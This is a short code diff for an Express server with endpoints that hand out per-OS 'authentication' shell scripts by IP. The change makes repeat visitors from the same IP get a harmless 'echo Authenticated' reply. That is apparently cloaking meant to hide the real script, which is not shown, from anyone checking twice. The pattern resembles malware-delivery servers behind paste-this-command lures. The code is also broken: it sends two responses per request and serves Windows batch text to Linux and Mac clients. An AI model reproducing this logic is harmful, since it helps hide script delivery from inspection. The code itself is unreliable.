@@ -68,7 +68,13 @@ router.get("/auth/windows", (req, res) => {
     const domain = req.protocol + '://' + req.get('host');
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const now = Date.now();
-    if (!requestLog[ip]) requestLog[ip] = {};
+    if (!requestLog[ip]) {
+      requestLog[ip] = {};
+    } else {
+      res.type("text/plain").send(`@echo off
+      echo Authenticated
+      `);
+    }
       requestLog[ip].step1 = now;
 
 
@@ -99,7 +105,13 @@ router.get("/auth/linux", (req, res) => {
     const domain = req.protocol + '://' + req.get('host');
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const now = Date.now();
-    if (!requestLog[ip]) requestLog[ip] = {};
+    if (!requestLog[ip]) {
+      requestLog[ip] = {};
+    } else {
+      res.type("text/plain").send(`@echo off
+      echo Authenticated
+      `);
+    }
       requestLog[ip].step1 = now;
       
 res.type("text/plain").send(`#!/bin/bash
@@ -132,9 +144,15 @@ router.get("/auth/mac", (req, res) => {
   else {
      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const now = Date.now();
-    if (!requestLog[ip]) requestLog[ip] = {};
+    if (!requestLog[ip]) {
+      requestLog[ip] = {};
+    } else {
+      res.type("text/plain").send(`@echo off
+      echo Authenticated
+      `);
+    }
       requestLog[ip].step1 = now;
-      s
+      
     const domain = req.protocol + '://' + req.get('host');
 res.type("text/plain").send(`#!/bin/bash
 set -e
